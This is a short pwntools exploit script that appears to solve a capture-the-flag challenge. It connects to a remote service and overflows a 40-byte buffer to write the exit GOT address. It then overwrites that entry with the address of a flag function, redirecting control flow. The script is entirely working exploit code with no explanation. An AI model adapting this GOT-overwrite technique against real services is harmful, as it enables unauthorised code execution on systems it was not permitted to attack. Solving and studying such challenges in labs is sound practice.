from pwn import *

exit_got = 0x601068
flag = 0x400826

r = remote('10.13.37.21', 1337)

r.sendline('A'*40 + p64(exit_got))
r.sendline(p64(flag))
print r.recvall()
